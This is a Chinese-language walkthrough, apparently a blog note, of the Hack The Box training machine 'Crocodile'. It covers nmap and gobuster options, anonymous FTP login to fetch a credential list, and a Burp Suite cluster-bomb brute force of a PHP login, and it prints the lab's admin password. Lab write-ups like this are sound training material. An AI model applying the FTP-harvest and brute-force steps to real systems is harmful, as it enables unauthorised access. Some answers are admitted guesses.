---
title: Crocodile
icon: dinasour
date: 2025-07-10
tags:
  - 目录扫描
  - FTP匿名登录
  - 手注
  - 弱口令
  - BurpSuite
  - 集群炸弹
category:
  - 打靶
  - HTB
---
## 参考资料 && 参考WP

***
## Tasks
### Task1 Nmap中用于开启默认脚本扫描的参数是什么
```
-sC
```
### Task2 端口`21`的服务是什么
```shell
nmap -sC -sV -T5 10.129.238.213
```
服务信息：
```
vsftpd 3.0.3
```

### Task3 FTP消息`Anonymous FTP login allowed`的消息码是多少
```
230
```
### Task4 FTP匿名登录所使用的用户名
```
anonymous
```
### Task5 FTP下载文件的指令是什么
```shell
get
```
### Task6 `allowed.userlist`中看起来最有权限的用户之一是什么
```
admin
```
### Task7 靶机上正在运行的Apache服务是什么
```shell
nmap -sC -sV -T5 -p 80,443,8080 10.129.238.213
```

```
Apache httpd 2.4.41
```
强行蒙出来，省得扫描
### Task8 Gobuster中用于指定文件类型的参数是什么
```
-x
```
![](assets/Pasted%20image%2020250710203100.png)
### Task9 目录扫描中发现的PHP登陆页面是什么
```
login.php
```
猜的
### flag
先把`allowed.userlist`下下来
```shell
ftp -4 -a 10.129.238.213
get allowed.userlist
```
![](assets/Pasted%20image%2020250710203406.png)
[list2card|addClass(ab-col2)]
- `allowed.userlist`
	```
	root
	Supersecretpassword1
	@BaASD&9032123sADS
	rKXM59ESxesUFHAd
	```
- `allowed.userlist.passwd`
	```
	aron
	pwnmeow
	egotisticalsw
	admin
	```
导入BP使用**集束炸弹**模式进行爆破
![](assets/Pasted%20image%2020250710205058.png)
```
admin:rKXM59ESxesUFHAd
```
![](assets/Pasted%20image%2020250710205119.png)

***
## 页面底部